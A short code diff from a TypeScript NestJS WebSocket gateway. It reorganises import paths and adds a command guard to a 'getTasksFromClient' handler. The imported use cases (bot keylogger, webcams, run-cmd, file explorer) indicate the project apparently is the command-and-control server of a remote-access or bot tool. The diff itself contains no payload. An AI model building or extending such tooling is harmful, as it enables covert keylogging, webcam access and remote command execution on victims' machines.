@@ -10,7 +10,7 @@ import { WsClientJoinsUseCase } from "../application/ws-client-joins.use-case";
 import { WsClientResetAllConnectionsUseCase } from "../application/ws-client-reset-all-connections-use-case";
 import { LoggerService } from "../../shared/providers";
 import { WsClientLeavesUseCase } from "../application/ws-client-leaves.use-case";
-import { WsClientGuard } from "../application/ws-client.guard";
+import { WsClientGuard } from "../application/guards/ws-client.guard";
 import type {
   GetExplorerFromClientEvent,
   RunCmdCommandEvent,
@@ -34,8 +34,8 @@ import Redis from "ioredis";
 import { InjectRedis } from "@nestjs-modules/ioredis";
 import path from "path";
 import { RedisRepository } from "@/src/repository/redis/domain/redis.repository";
-import { CommandsGuard } from "../../client/domain/commands.guard";
-import { SetCommand } from "../../client/domain/commands.decorator";
+import { CommandsGuard } from "../../client/application/commands.guard";
+import { SetCommand } from "../../../decorators/commands.decorator";
 import { WsBotKeyLoggerUseCase } from "../../ws-bot/application/events/ws-bot-keylogger.use-case";
 import { WsBotSendMessageUseCase } from "../../ws-bot/application/events/ws-bot-send-message.use-case";
 import { WsBotWebcamsUseCase } from "../../ws-bot/application/events/ws-bot-webcams.use-case";
@@ -210,7 +210,7 @@ export class WsClientGateway
     });
   }
 
-  @UseGuards(WsClientGuard)
+  @UseGuards(WsClientGuard, CommandsGuard)
   @SetCommand("process")
   @SubscribeMessage("getTasksFromClient")
   getTasksFromClient(client: Socket, data: TasksEvent) {
